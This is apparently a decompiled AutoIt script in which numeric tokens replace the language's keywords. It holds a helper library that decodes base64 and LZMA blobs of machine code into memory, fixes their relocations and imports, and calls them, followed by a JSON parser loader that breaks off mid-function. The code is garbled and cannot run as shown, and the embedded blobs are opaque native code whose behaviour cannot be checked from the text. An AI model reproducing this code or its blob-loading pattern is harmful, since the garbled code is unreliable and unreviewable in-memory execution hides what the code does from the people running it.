$CODEBASE=_BINARYCALL_CREATE("AwAAAARiAQAAAAAAAAArkuFQDAlvIp0qAgbDnjr76UDZs1EPNIP2K18t9s6SNTbd43IB7HfdyPM8VfD/o36z4AmSW2m2AIsC6Af3fKNsHU4BdQKGd0PQXHxPSX0iNqp1YAKovksqQna06NeKMoOYqryTUX4WgpHjokhp6zY2sEFSIjcL7dW3FDoNVz4bGPyZHRvjFwmqvr7YGlNYKwNoh+SYCXmIgVPVZ63Vz1fbT33/QFpWmWOeBRqs4J+c8Qp6zJFsK345Pjw0I8kMSsnho4F4oNzQ2OsAbmIioaQ6Ma2ziw5NH+M+t4SpEeHDnBdUTTL20sxWZ0yKruFAsBIRoHvM7LYcid2eBV2d5roSjnkwMG0g69LNjs1fHjbI/9iU/hJwpSsgl4fltXdZG659/li13UFY89M7UfckiZ9XOeBM0zadgNsy8r8M3rEAAA==")
6
$CODEBASE=_BINARYCALL_CREATE("AwAAAARVAQAAAAAAAAAqr7blBndrIGnmhhfXD7R1fkOTKhicg1W6MCtStbz+CsneBEg0bbHH1sqTLmLfY7A6LqZl6LYWT5ULVj6MXgugPbBn9wKsSU2ZCcBBPNkx09HVPdUaKnbqghDGj/C5SHoF+A/5g+UgE1C5zJZORjJ8ljs5lt2Y9lA4BsY7jVKX2vmDvHK1NnSR6nVwh7Pb+Po/UpNcy5sObVWDKkYSCCtCIjKIYqOe3c6k8Xsp4eritCUprXEVvCFi7K5Z6HFXdm3nZsFcE+eSJ1WkRnVQbWcmpjGMGka61C68+CI7tsQ13UnCFWNSpDrCbzUejMZh8HdPgEc5vCg3pKMKin/NavNpB6+87Y9y7HIxmKsPdjDT30u9hUKWnYiRe3nrwKyVDsiYpKU/Nse368jHag5B5or3UKA+nb2+eY8JwzgA")
8
43$CODEBASE534287(1,0,13(""))
8
$SRC=13($SRC)
28$SRCLEN=14($SRC)
28$SRCBUF=65("byte["&$SRCLEN&"]")
69($SRCBUF,1,$SRC)
28$DSTLEN=217(($SRCLEN+2)/3)*4+1
28$DSTBUF=65("char["&$DSTLEN&"]")
28$RET=59("uint:cdecl",$CODEBASE,"ptr",67($SRCBUF),"uint",$SRCLEN,"ptr",67($DSTBUF),"uint",$DSTLEN)
4$RET[0]=053413("")
34325(66($DSTBUF,1),1,$RET[0])
33
32_BINARYCALL_LZMADECOMPRESS($SRC)
31$CODEBASE
43$CODEBASE5
4@AUTOITX645
$CODEBASE=_BINARYCALL_CREATE(_BINARYCALL_BASE64DECODE("QVcxwEFWQVVBVFVXSInXVkiJzlMx20iB7OgAAABEiiFBgPzgdgnpyQAAAEGD7C1BiMf/wEGA/Cx38THA6wRBg+wJQYjG/8BBgPwId/GLRglEi24FQQ+2zkyJRCQoRQ+2/0HB5xBBiQFBD7bEAcG4AAMAANPgjYQAcA4AAEhjyOjIBAAATInpSInF6L0EAABIicMxwEyJ8kSI4EyLRCQoiNQl//8A/0QJ+EiF24lFAHQoTYXtdCNIjVfzSI1MJDhIg8YNTIkEJE2J6UmJ2EiJ7+g2AAAAicbrBb4BAAAASInp6IQEAACF9nQKSInZMdvodgQAAEiJ2EiBxOgAAABbXl9dQVxBXUFeQV/DVVNBV0FWQVVBVEFQTQHBQVFNicVRVkgB8lJIieX8SYn0iwdMjX8Eik8Cg8r/0+L30olV6Ijhg8r/0+L30olV5ADBiUXsuAEAAACJReCJRdyJRdhIiUXQRSnJKfaDy/8A0bgAAwAA0+BIjYg2BwAAuAAEAARMif/R6fOrvwUAAADoUAMAAP/PdfdEie9EicgrfSDB4ARBifpEI1XoRAHQTY0cR+hAAwAAD4WTAAAAik3sI33k0+eA6Qj22dPuAfe4AQAAAEiNPH++AAEAAMHnCEGD+QdNjbR/bA4AAHI0TInvSCt90A+2P9HnQYnzIf5BAfNPjRxe6O8CAACJwcHuCIPhATnOvgABAAB1DjnGd9jrDE2J8+jQAgAAOfBy9EyJ76pEiclBg/kEcg65AwAAAEGD+QpyA4PBA0EpyelDAgAAT42cT4ABAADomgIAAHUsi0XcQYP5B4lF4BnAi1XY99CLTdCD4AOJVdxBicGJTdhNjbdkBgAA6akAAABPjZxPmAEAAOhfAgAAdUZEicjB4AREAdBNjZxH4AEAAOhHAgAAdWpBg/kHuQkAAAByA4PBAkGJyUyJ70grfdBIO30gD4L9AQAAigdIA33QqumzAQAAT42cT7ABAADoCgIAAIt12HQhT42cT8gBAADo+AEAAIt13HQJi03ci3XgiU3gi03YiU3ci03QiU3YiXXQQYP5B7kIAAAAcgODwQNBiclNjbdoCgAATYnz6LsBAAB1FESJ0CnJweADvggAAABJjXxGBOs2TY1eAuicAQAAdRpEidC5CAAAAMHgA74IAAAASY28RgQBAADrEUmNvgQCAAC5EAAAAL4AAQAAiU3MuAEAAABJifvoYQEAAInCKfJy8gNVzEGD+QSJVcwPg7kAAABBg8EHuQMAAAA50XICidHB4Qa4AQAAAEmNvE9gAwAAvkAAAABJifvoHwEAAEGJwkEp8nLwQYP6BHJ4RInWRIlV0NHug2XQAf/Og03QAkGD+g5zFYnx0mXQi0XQRCnQTY20R14FAADrLIPuBOi6AAAA0evRZdBBOdhyBv9F0EEp2P/OdedNjbdEBgAAwWXQBL4EAAAAvwEAAACJ+E2J8+ioAAAAqAF0Awl90NHn/8516+sERIlV0P9F0EyJ74tNzEiJ+IPBAkgrRSBIOUXQd1RIif5IK3XQSItVGKyqSDnXcwT/yXX1SYn9D7bwTDttGA+C9fz//+gwAAAAKcBIi1UQTCtlCESJIkiLVWBMK20gRIkqSIPEKEFcQV1BXUFfW13DXli4AQAAAOvSgfsAAAABcgHDweMITDtlAHPmQcHgCEWKBCRJg8QBwynATY0cQ4H7AAAAAXMVweMITDtlAHPBQcHgCEWKBCRJg8QBidlBD7cTwekLD6/KQTnIcxOJy7kACAAAKdHB6QVmQQELAcDDKcvB6gVBKchmQSkTAcCDwAHDSLj////////////gbXN2Y3J0LmRsbHxtYWxsb2MASLj////////////gZnJlZQA="))
6
$CODEBASE=_BINARYCALL_CREATE(_BINARYCALL_BASE64DECODE("VYnlVzH/VlOD7EyLXQiKC4D54A+HxQAAADHA6wWD6S2I0ID5LI1QAXfziEXmMcDrBYPpCYjQgPkIjVABd/OIReWLRRSITeSLUwkPtsmLcwWJEA+2ReUBwbgAAwAA0+CNhABwDgAAiQQk6EcEAACJNCSJRdToPAQAAItV1InHi0Xkhf+JArgBAAAAdDaF9nQyi0UQg8MNiRQkiXQkFIl8JBCJRCQYjUXgiUQkDItFDIlcJASD6A2JRCQI6CkAAACLVdSJRdSJFCToAQQAAItF1IXAdAqJPCQx/+jwAwAAg8RMifhbXl9dw1dWU1WJ5YtFJAFFKFD8i3UYAXUcVot1FK2SUopO/oPI/9Pg99BQiPGDyP/T4PfQUADRifeD7AwpwEBQUFBQUFcp9laDy/+4AAMAANPgjYg2BwAAuAAEAATR6fOragVZ6MoCAADi+Yt9/ItF8Ct9JCH4iUXosADoywIAAA+FhQAAAIpN9CN97NPngOkI9tnT7lgB916NPH/B5wg8B1qNjH5sDgAAUVa+AAEAAFCwAXI0i338K33cD7Y/i23M0eeJ8SH+AfGNbE0A6JgCAACJwcHuCIPhATnOvgABAAB1DjnwctfrDIttzOh5AgAAOfBy9FqD+gSJ0XIJg/oKsQNyArEGKcpS60mwwOhJAgAAdRRYX1pZWln/NCRRUrpkBgAAsQDrb7DM6CwCAAB1LLDw6BMCAAB1U1g8B7AJcgKwC1CLdfwrddw7dSQPgs8BAACsi338qumOAQAAsNjo9wEAAIt12HQbsOTo6wEAAIt11HQJi3XQi03UiU3Qi03YiU3Ui03ciU3YiXXcWF9ZumgKAACxCAH6Ulc8B4jIcgIEA1CLbczovAEAAHUUi0Xoi33MweADKclqCF6NfEcE6zWLbcyDxQLomwEAAHUYi0Xoi33MweADaghZaghejbxHBAEAAOsQvwQCAAADfcxqEFm+AAEAAIlN5CnAQIn96GYBAACJwSnxcvMBTeSDfcQED4OwAAAAg0XEB4tN5IP5BHIDagNZi33IweEGKcBAakBejbxPYAMAAIn96CoBAACJwSnxcvOJTeiJTdyD+QRyc4nOg2XcAdHug03cAk6D+Q5zGbivAgAAKciJ8dJl3ANF3NHgA0XIiUXM6y2D7gToowAAANHr0WXcOV3gcgb/RdwpXeBOdei4RAYAAANFyIlFzMFl3ARqBF4p/0eJ+IttzOi0AAAAqAF0Awl93NHnTnXs6wD/RdyLTeSDwQKLffyJ+CtFJDlF3HdIif4rddyLVSisqjnXcwNJdfeJffwPtvA7fSgPgnH9///oKAAAACnAjWwkPItVIIt1+Ct1GIkyi1Usi338K30kiTrJW15fw15YKcBA69qB+wAAAAFyAcPB4whWi3X4O3Ucc+SLReDB4AisiUXgiXX4XsOLTcQPtsDB4QQDRegByOsGD7bAA0XEi23IjWxFACnAjWxFAIH7AAAAAXMci0wkOMFkJCAIO0wkXHOcihH/RCQ4weMIiFQkIInZD7dVAMHpCw+vyjlMJCBzF4nLuQAIAAAp0cHpBWYBTQABwI1sJEDDweoFKUwkICnLZilVAAHAg8ABjWwkQMO4///////gbXN2Y3J0LmRsbHxtYWxsb2MAuP//////4GZyZWUA"))
8
43$CODEBASE534287(1,0,13(""))
8
$SRC=13($SRC)
28$SRCLEN=14($SRC)
28$SRCBUF=65("byte["&$SRCLEN&"]")
69($SRCBUF,1,$SRC)
28$RET=59("ptr:cdecl",$CODEBASE,"ptr",67($SRCBUF),"uint_ptr",$SRCLEN,"uint_ptr*",0,"uint*",0)
4$RET[0]5
28$DSTBUF=65("byte["&$RET[3]&"]",$RET[0])
28$OUTPUT=66($DSTBUF,1)
58($__BINARYCALL_MSVCRTDLL,"none:cdecl","free","ptr",$RET[0])
34$OUTPUT
8
34287(2,0,13(""))
33
32_BINARYCALL_RELOCATION($BASE,$RELOC)
28$SIZE=217(15($RELOC,1,2))
13$I=31514($RELOC)16$SIZE
28$OFFSET=217(15($RELOC,$I,$SIZE))
28$PTR=$BASE+$OFFSET
69(65("ptr",$PTR),1,66(65("ptr",$PTR),1)+$BASE)
14
33
32_BINARYCALL_IMPORTLIBRARY($BASE,$LENGTH)
28$JMPBIN,$JMPOFF,$JMPLEN,$DLLNAME,$PROCNAME
4@AUTOITX645
$JMPBIN=13("0x48B8FFFFFFFFFFFFFFFFFFE0")
$JMPOFF=2
6
$JMPBIN=13("0xB8FFFFFFFFFFE0")
$JMPOFF=1
8
$JMPLEN=14($JMPBIN)
11
28$PTR=_BINARYCALL_MEMORYSEARCH($BASE,$LENGTH,$JMPBIN)
4$PTR=0518
28$STRINGPTR=$PTR+$JMPLEN
28$STRINGLEN=_BINARYCALL_LSTRLENA($STRINGPTR)
28$STRING=66(65("char["&$STRINGLEN&"]",$STRINGPTR),1)
28$SPLIT=331($STRING,"|")
4$SPLIT[0]=15
$PROCNAME=$SPLIT[1]
7$SPLIT[0]=25
4$SPLIT[1]5$DLLNAME=$SPLIT[1]
$PROCNAME=$SPLIT[2]
8
4$DLLNAME1$PROCNAME5
28$HANDLE=_BINARYCALL_LOADLIBRARY($DLLNAME)
43$HANDLE5
$__BINARYCALL_LASTERROR="LoadLibrary fail on "&$DLLNAME
34287(1,0,40)
8
28$PROC=_BINARYCALL_GETPROCADDRESS($HANDLE,$PROCNAME)
43$PROC5
$__BINARYCALL_LASTERROR="GetProcAddress failed on "&$PROCNAME
34287(2,0,40)
8
69(65("ptr",$PTR+$JMPOFF),1,$PROC)
8
28$DIFF=217($PTR-$BASE+$JMPLEN+$STRINGLEN+1)
$BASE+=$DIFF
$LENGTH-=$DIFF
12$LENGTH<=$JMPLEN
3439
33
32_BINARYCALL_CODEPREPARE($CODE)
43$CODE534""
4220($CODE)534$CODE
$CODE=306($CODE)
4322($CODE,2)="0x"53413($CODE)
4321($CODE)53413("0x"&$CODE)
34_BINARYCALL_LZMADECOMPRESS(_BINARYCALL_BASE64DECODE($CODE))
33
32_BINARYCALL_SYMBOLFIND($CODEBASE,$IDENTIFY,$LENGTH=41)
$IDENTIFY=13($IDENTIFY)
4228($LENGTH)5
$LENGTH=_BINARYCALL_REGIONSIZE($CODEBASE)
8
28$PTR=_BINARYCALL_MEMORYSEARCH($CODEBASE,$LENGTH,$IDENTIFY)
4$PTR=0534287(1,0,0)
34$PTR+14($IDENTIFY)
33
32_BINARYCALL_SYMBOLLIST($CODEBASE,$SYMBOL)
43219($SYMBOL)2$CODEBASE=0534287(1,0,0)
28$TAG=""
13$I=015369($SYMBOL)-1
$TAG&="ptr "&$SYMBOL[$I]&";"
14
28$SYMBOLLIST=65($TAG)
4@ERROR534287(1,0,0)
13$I=015369($SYMBOL)-1
$CODEBASE=_BINARYCALL_SYMBOLFIND($CODEBASE,$SYMBOL[$I])
69($SYMBOLLIST,$SYMBOL[$I],$CODEBASE)
14
34$SYMBOLLIST
33
32_BINARYCALL_CREATE($CODE,$RELOC="",$PADDING=0,$RELEASEONEXIT=39,$LIBRARYIMPORT=39)
28$BINARYCODE=_BINARYCALL_CODEPREPARE($CODE)
43$BINARYCODE534287(1,0,0)
28$BINARYCODELEN=14($BINARYCODE)
28$TOTALCODELEN=$BINARYCODELEN+$PADDING
28$CODEBASE=_BINARYCALL_ALLOC($BINARYCODE,$PADDING)
43$CODEBASE534287(2,0,0)
4$RELOC5
$RELOC=_BINARYCALL_CODEPREPARE($RELOC)
43$RELOC534287(3,0,0)
_BINARYCALL_RELOCATION($CODEBASE,$RELOC)
8
4$LIBRARYIMPORT5
43_BINARYCALL_IMPORTLIBRARY($CODEBASE,$BINARYCODELEN)5
_BINARYCALL_FREE($CODEBASE)
34287(4,0,0)
8
8
4$RELEASEONEXIT5
_BINARYCALL_RELEASEONEXIT($CODEBASE)
8
34287(0,$TOTALCODELEN,$CODEBASE)
33
32_BINARYCALL_COMMANDLINETOARGV($COMMANDLINE,36$ARGC,$ISUNICODE=40)
31$SYMBOLLIST
43223($SYMBOLLIST)5
28$CODE
4@AUTOITX645
$CODE="AwAAAASuAgAAAAAAAAAkL48ClEB9jTEOeYv4yYTosNjFNgf81Ag4vS2VP4y4wxFa+4yMI7GDB7CG+xn4JE3cdEVvk8cMp4oIuS3DgTxlcKHGVIg94tvzG/256bizZfGtAETQUCPQjW5+JSx2C/Y4C0VNJMKTlSCHiV5AzXRZ5gw3WFghbtkCCFxWOX+RDSI2oH/vROEOnqc0jfKTo17EBjqX+dW3QxrUe45xsbyYTZ9ccIGySgcOAxetbRiSxQnz8BOMbJyfrbZbuVJyGpKrXFLh/5MlBZ09Cim9qgflbGzmkrGStT9QL1f+O2krzyOzgaWWqhWL6S+y0G32RWVi0uMLR/JOGLEW/+Yg/4bzkeC0lKELT+RmWAatNa38BRfaitROMN12moRDHM6LYD1lzPLnaiefSQRVti561sxni/AFkYoCb5Lkuyw4RIn/r/flRiUg5w48YkqBBd9rXkaXrEoKwPg6rmOvOCZadu//B6HN4+Ipq5aYNuZMxSJXmxwXVRSQZVpSfLS2ATZMd9/Y7kLqrKy1H4V76SgI/d9OKApfKSbQ8ZaKIHBCsoluEip3UDOB82Z21zd933UH5l0laGWLIrTz7xVGkecjo0NQzR7LyhhoV3xszlIuw2v8q0Q/S9LxB5G6tYbOXo7lLjNIZc0derZz7DNeeeJ9dQE9hp8unubaTBpulPxTNtRjog=="
6
$CODE="AwAAAAR6AgAAAAAAAABcQfD553vjya/3DmalU0BKqABevUb/60GZ55rMwmzpQfPSRUlIl04lEiS8RDrXpS0EoBUe+uzDgZd37nVu9wsJ4fykqYvLoMz3ApxQbTBKleOIRSla6I0V8dNP3P7rHeUfjH0jCho0RvhhVpf0o4ht/iZptauxaoy1zQ19TkPZ/vf5Im8ecY6qEdHNzjo2H60jVwiOJ+1J47TmQRwxJ+yKLakq8QNxtKkRIB9B9ugfo3NAL0QslDxbyU0dSgw2aOPxV+uttLzYNnWbLBZVQbchcKgLRjC/32U3Op576sOYFolB1Nj4/33c7MRgtGLjlZfTB/4yNvd4/E+u3U6/Q4MYApCfWF4R/d9CAdiwgIjCYUkGDExKjFtHbAWXfWh9kQ7Q/GWUjsfF9BtHO6924Cy1Ou+BUKksqsxmIKP4dBjvvmz9OHc1FdtR9I63XKyYtlUnqVRtKwlNrYAZVCSFsyAefMbteq1ihU33sCsLkAnp1LRZ2wofgT1/JtT8+GO2s/n52D18wM70RH2n5uJJv8tlxQc1lwbmo4XQvcbcE91U2j9glvt2wC1pkP0hF23Nr/iiIEZHIPAOAHvhervlHE830LSHyUx8yh5Tjojr0gdLvQ=="
8
28$CODEBASE=_BINARYCALL_CREATE($CODE)
4@ERROR534287(1,0,0)
28$SYMBOL[]=["ToArgvW","ToArgvA"]
$SYMBOLLIST=_BINARYCALL_SYMBOLLIST($CODEBASE,$SYMBOL)
4@ERROR534287(1,0,0)
8
28$RET
4$ISUNICODE5
$RET=59("ptr:cdecl",66($SYMBOLLIST,"ToArgvW"),"wstr",$COMMANDLINE,"int*",0)
6
$RET=59("ptr:cdecl",66($SYMBOLLIST,"ToArgvA"),"str",$COMMANDLINE,"int*",0)
8
43@ERROR1$RET[0]<>05
_BINARYCALL_RELEASEONEXIT($RET[0])
$ARGC=$RET[2]
34$RET[0]
6
34287(2,0,0)
8
33
32_BINARYCALL_STDIOREDIRECT($FILENAME="CON",$FLAG=1+2+4)
31$SYMBOLLIST
43223($SYMBOLLIST)5
28$CODE,$RELOC
4@AUTOITX645
$CODE="AwAAAASjAQAAAAAAAAAkL48ClEB9jTEOeYv4yYTosNjFM1rLNdMULriZUDxTj+ZdkQ01F5zKL+WDCScfQKKLn66EDmcA+gXIkPcZV4lyz8VPw8BPZlNB5KymydM15kCA+uqvmBc1V0NJfzgsF0Amhn0JhM/ZIguYCHxywMQ1SgKxUb05dxDg8WlX/2aPfSolcX47+4/72lPDNTeT7d7XRdm0ND+eCauuQcRH2YOahare9ASxuU4IMHCh2rbZYHwmTNRiQUB/8dLGtph93yhmwdHtyMPLX2x5n6sdA1mxua9htLsLTulE05LLmXbRYXylDz0A"
$RELOC="AwAAAAQIAAAAAAAAAAABAB7T+CzGn9ScQAC="
6
$CODE="AwAAAASVAQAAAAAAAABcQfD553vjya/3DmalU0BKqABaUcndypZ3mTYUkHxlLV/lKZPrXYWXgNATjyiowkUQGDVYUy5THQwK4zYdU7xuGf7qfVDELc1SNbiW3NgD4D6N6ZM7auI1jPaThsPfA/ouBcx2aVQX36fjmViTZ8ZLzafjJeR7d5OG5s9sAoIzFLTZsqrFlkIJedqDAOfhA/0mMrkavTWnsio6yTbic1dER0DcEsXpLn0vBNErKHoagLzAgofHNLeFRw5yHWz5owR5CYL7rgiv2k51neHBWGx97A=="
$RELOC="AwAAAAQgAAAAAAAAAAABABfyHS/VRkdjBBzbtGPD6vtmVH/IsGHYvPsTv2lGuqJxGlAA"
8
28$CODEBASE=_BINARYCALL_CREATE($CODE,$RELOC)
4@ERROR534287(1,0,0)
28$SYMBOL[]=["StdinRedirect","StdoutRedirect","StderrRedirect"]
$SYMBOLLIST=_BINARYCALL_SYMBOLLIST($CODEBASE,$SYMBOL)
4@ERROR534287(1,0,0)
8
417($FLAG,1)559("none:cdecl",66($SYMBOLLIST,"StdinRedirect"),"str",$FILENAME)
417($FLAG,2)559("none:cdecl",66($SYMBOLLIST,"StdoutRedirect"),"str",$FILENAME)
417($FLAG,4)559("none:cdecl",66($SYMBOLLIST,"StderrRedirect"),"str",$FILENAME)
33
32_BINARYCALL_STDINREDIRECT($FILENAME="CON")
28$RET=_BINARYCALL_STDIOREDIRECT($FILENAME,1)
34287(@ERROR,@EXTENDED,$RET)
33
32_BINARYCALL_STDOUTREDIRECT($FILENAME="CON")
28$RET=_BINARYCALL_STDIOREDIRECT($FILENAME,2)
34287(@ERROR,@EXTENDED,$RET)
33
32_BINARYCALL_STDERRREDIRECT($FILENAME="CON")
28$RET=_BINARYCALL_STDIOREDIRECT($FILENAME,4)
34287(@ERROR,@EXTENDED,$RET)
33
32_BINARYCALL_RELEASEONEXIT($PTR)
256("__BinaryCall_DoRelease")
__BINARYCALL_RELEASEONEXIT_HANDLE($PTR)
33
32__BINARYCALL_DORELEASE()
__BINARYCALL_RELEASEONEXIT_HANDLE()
33
32__BINARYCALL_RELEASEONEXIT_HANDLE($PTR=41)
31$PTRLIST
4@NUMPARAMS=05
4219($PTRLIST)5
13$I=115$PTRLIST[0]
_BINARYCALL_FREE($PTRLIST[$I])
14
8
6
43219($PTRLIST)5
28$INITARRAY[1]=[0]
$PTRLIST=$INITARRAY
8
4232($PTR)5
28$ARRAY=$PTRLIST
28$SIZE=369($ARRAY)
27$ARRAY[$SIZE+1]
$ARRAY[$SIZE]=$PTR
$ARRAY[0]+=1
$PTRLIST=$ARRAY
8
8
33
2930$JSON_UNESCAPED_UNICODE=1
2930$JSON_UNESCAPED_SLASHES=2
2930$JSON_HEX_TAG=4
2930$JSON_HEX_AMP=8
2930$JSON_HEX_APOS=16
2930$JSON_HEX_QUOT=32
2930$JSON_UNESCAPED_ASCII=64
2930$JSON_PRETTY_PRINT=128
2930$JSON_STRICT_PRINT=256
2930$JSON_UNQUOTED_STRING=512
2930$JSMN_ERROR_NOMEM=-1
2930$JSMN_ERROR_INVAL=-2
2930$JSMN_ERROR_PART=-3
32__JSMN_RUNTIMELOADER($PROCNAME="")
31$SYMBOLLIST
43223($SYMBOLLIST)5
28$CODE
4@AUTOITX645
$CODE="AwAAAAQfCAAAAAAAAAA1HbEvgTNrvX54gCiWSTVmt5v7RCdoFJ/zhkKmwcm8yVqZPjJBoVhNHHAIzrHWKbZh1J0QAUaHB5zyQTilTmWa9O0OKeLrk/Jg+o7CmMzjEk74uPongdHv37nwYXvg97fiHvjP2bBzI9gxSkKq9Cqh/GxSHIlZPYyW76pXUt//25Aqs2Icfpyay/NFd50rW7eMliH5ynkrp16HM1afithVrO+LpSaz/IojowApmXnBHUncHliDqbkx6/AODUkyDm1hj+AiEZ9Me1Jy+hBQ1/wC/YnuuYSJvNAKp6XDnyc8Nwr54Uqx5SbUW2CezwQQ7aXX/HFiHSKpQcFW/gi8oSx5nsoxUXVjxeNI/L7z6GF2mfu3Tnpt7hliWEdA2r2VB+TIM7Pgwl9X3Ge0T3KJQUaRtLJZcPvVtOuKXr2Q9wy7hl80hVRrt9zYrbjBHXLrRx/HeIMkZwxhmKo/dD/vvaNgE+BdU8eeJqFBJK2alrK2rh2WkRynftyepm1WrdKrz/5KhQPp/4PqH+9IADDjoGBbfvJQXdT+yiO8DtfrVnd+JOEKsKEsdgeM3UXx5r6tEHO9rYWbzbnyEiX7WozZemry+vBZMMtHn1aA63+RcDQED73xOsnj00/9E5Z6hszM5Hi8vi6Hw3iOgf3cHwcXG44aau0JpuA2DlrUvnJOYkNnY+bECeSdAR1UQkFNyqRoH2xm4Y7gYMCPsFtPBlwwleEKI27SsUq1ZHVQvFCoef7DXgf/GwPCAvwDMIQfb3hJtIVubOkASRQZVNIJ/y4KPrn/gcASV7fvMjE34loltTVlyqprUWxpI51tN6vhTOLAp+CHseKxWaf9g1wdbVs0e/5xAiqgJbmKNi9OYbhV/blpp3SL63XKxGiHdxhK1aR+4rUY4eckNbaHfW7ob+q7aBoHSs6LVX9lWakb/xWxwQdwcX/7/C+TcQSOOg6rLoWZ8wur9qp+QwzoCbXkf04OYpvD5kqgEiwQnB90kLtcA+2XSbDRu+aq02eNNCzgkZujeL/HjVISjf2EuQKSsZkBhS15eiXoRgPaUoQ5586VS7t7rhM8ng5LiVzoUQIZ0pNKxWWqD+gXRBvOMIXY2yd0Ei4sE5KFIEhbs3u8vwP7nFLIpZ/RembPTuc0ZlguGJgJ2F5iApfia+C2tRYRNjVCqECCveWw6P2Btfaq9gw7cWWmJflIQbjxtccDqsn52cftLqXSna9zk05mYdJSV8z2W7vM1YJ5Rd82v0j3kau710A/kQrN41bdaxmKjL+gvSRlOLB1bpvkCtf9+h+eVA4XIkIXKFydr1OjMZ8wq2FIxPJXskAe4YMgwQmeWZXMK1KBbLB3yQR1YOYaaHk1fNea9KsXgs5YLbiP/noAusz76oEDo/DJh1aw7cUwdhboVPg1bNq88mRb5RGa13KDK9uEET7OA02KbSL+Q4HOtyasLUoVrZzVyd8iZPoGrV36vHnj+yvG4fq6F/fkug/sBRp186yVZQVmdAgFd+WiRLnUjxHUKJ6xBbpt4FTP42E/PzPw3JlDb0UQtXTDnIL0CWqbns2E7rZ5PBwrwQYwvBn/gaEeLVGDSh84DfW4zknIneGnYDXdVEHC+ITzejAnNxb1duB+w2aVTk64iXsKHETq53GMH6DuFi0oUeEFb/xp0HsRyNC8vBjOq3Kk7NZHxCQLh7UATFttG7sH+VIqGjjNwmraGJ0C92XhpQwSgfAb3KHucCHGTTti0sn6cgS3vb36BkjGKsRhXVuoQCFH96bvTYtl8paQQW9ufRfvxPqmU0sALdR0fIvZwd7Z8z0UoEec6b1Sul4e60REj/H4scb6N2ryHBR9ua5N1YxJu1uwgoLXUL2wT9ZPBjPjySUzeqXikUIKKYgNlWy+VlNIiWWTPtKpCTr508logA=="
6
$CODE="AwAAAASFBwAAAAAAAAA1HbEvgTNrvX54gCiqsa1mt5v7RCdoAFjCfVE40DZbE5UfabA9UKuHrjqOMbvjSoB2zBJTEYEQejBREnPrXL3VwpVOW+L9SSfo0rTfA8U2W+Veqo1uy0dOsPhl7vAHbBHrvJNfEUe8TT0q2eaTX2LeWpyrFEm4I3mhDJY/E9cpWf0A78e+y4c7NxewvcVvAakIHE8Xb8fgtqCTVQj3Q1eso7n1fKQj5YsQ20A86Gy9fz8dky78raeZnhYayn0b1riSUKxGVnWja2i02OvAVM3tCCvXwcbSkHTRjuIAbMu2mXF1UpKci3i/GzPmbxo9n/3aX/jpR6UvxMZuaEDEij4yzfZv7EyK9WCNBXxMmtTp3Uv6MZsK+nopXO3C0xFzZA/zQObwP3zhJ4sdatzMhFi9GAM70R4kgMzsxQDNArueXj+UFzbCCFZ89zXs22F7Ixi0FyFTk3jhH56dBaN65S+gtPztNGzEUmtk4M8IanhQSw8xCXr0x0MPDpDFDZs3aN5TtTPYmyk3psk7OrmofCQGG5cRcqEt9902qtxQDOHumfuCPMvU+oMjzLzBVEDnBbj+tY3y1jvgGbmEJguAgfB04tSeAt/2618ksnJJK+dbBkDLxjB4xrFr3uIFFadJQWUckl5vfh4MVXbsFA1hG49lqWDa7uSuPCnOhv8Yql376I4U4gfcF8LcgorkxS+64urv2nMUq6AkBEMQ8bdkI64oKLFfO7fGxh5iMNZuLoutDn2ll3nq4rPi4kOyAtfhW0UPyjvqNtXJ/h0Wik5Mi8z7BVxaURTDk81TP8y9+tzjySB/uGfHFAzjF8DUY1vqJCgn0GQ8ANtiiElX/+Wnc9HWi2bEEXItbm4yv97QrEPvJG9nPRBKWGiAQsIA5J+WryX5NrfEfRPk0QQwyl16lpHlw6l0UMuk7S21xjQgyWo0MywfzoBWW7+t4HH9sqavvP4dYAw81BxXqVHQhefUOS23en4bFUPWE98pAN6bul+kS767vDK34yTC3lA2a8wLrBEilmFhdB74fxbAl+db91PivhwF/CR4Igxr35uLdof7+jAYyACopQzmsbHpvAAwT2lapLix8H03nztAC3fBqFSPBVdIv12lsrrDw4dfhJEzq7AbL/Y7L/nIcBsQ/3UyVnZk4kZP1KzyPCBLLIQNpCVgOLJzQuyaQ6k2QCBy0eJ0ppUyfp54LjwVg0X7bwncYbAomG4ZcFwTQnC2AX3oYG5n6Bz4SLLjxrFsY+v/SVa+GqH8uePBh1TPkHVNmzjXXymEf5jROlnd+EjfQdRyitkjPrg2HiQxxDcVhCh5J2L5+6CY9eIaYgrbd8zJnzAD8KnowHwh2bi4JLgmt7ktJ1XGizox7cWf3/Dod56KAcaIrSVw9XzYybdJCf0YRA6yrwPWXbwnzc/4+UDkmegi+AoCEMoue+cC7vnYVdmlbq/YLE/DWJX383oz2Ryq8anFrZ8jYvdoh8WI+dIugYL2SwRjmBoSwn56XIaot/QpMo3pYJIa4o8aZIZrjvB7BXO5aCDeMuZdUMT6AXGAGF1AeAWxFd2XIo1coR+OplMNDuYia8YAtnSTJ9JwGYWi2dJz3xrxsTQpBONf3yn8LVf8eH+o5eXc7lzCtHlDB+YyI8V9PyMsUPOeyvpB3rr9fDfNy263Zx33zTi5jldgP2OetUqGfbwl+0+zNYnrg64bluyIN/Awt1doDCQkCKpKXxuPaem/SyCHrKjg"
8
28$SYMBOL[]=["jsmn_parse","jsmn_init","json_string_decode","json_string_encode"]
28$CODEBASE=_BINARYCALL_CREATE($CODE)
4@ERROR535249(16,"Json","Startup Failure!")
$SYMBOLLIST=_BINARYCALL_SYMBOLLIST($CODEBASE,$SYMBOL)
4@ERROR535249(16,"Json","Startup Failure!")
8
4$PROCNAME53466($SYMBOLLIST,$PROCNAME)
33
32JSON_STRINGENCODE($STRING,$OPTION=0)
31$JSON_STRINGENCODE=__JSMN_RUNTIMELOADER("json_string_encode")
28$LENGTH=323($STRING)*6+1
28$BUFFER=65("wchar["&$LENGTH&"]")
28$RET=59("int:cdecl",$JSON_STRINGENCODE,"wstr",$STRING,"ptr",67($BUFFER),"uint",$LENGTH,"int",$OPTION)
34287($RET[0],0,66($BUFFER,1))
33
32JSON_STRINGDECODE($STRING)
31$JSON_STRINGDECODE=__JSMN_RUNTIMELOADER("json_string_decode")
28$LENGTH=323($STRING)+1
28$BUFFER=65("wchar["&$LENGTH&"]")
28$RET=59("int:cdecl",$JSON_STRINGDECODE,"wstr",$STRING,"ptr",67($BUFFER),"uint",$LENGTH)
34287($RET[0],0,66($BUFFER,1))
33
32JSON_DECODE($JSON,$INITTOKENCOUNT=1000)
31$JSMN_INIT=__JSMN_RUNTIMELOADER("jsmn_init"),$JSMN_PARSE=__JSMN_RUNTIMELOADER("jsmn_parse")
4$JSON=""5$JSON='""'
28$TOKENLIST,$RET
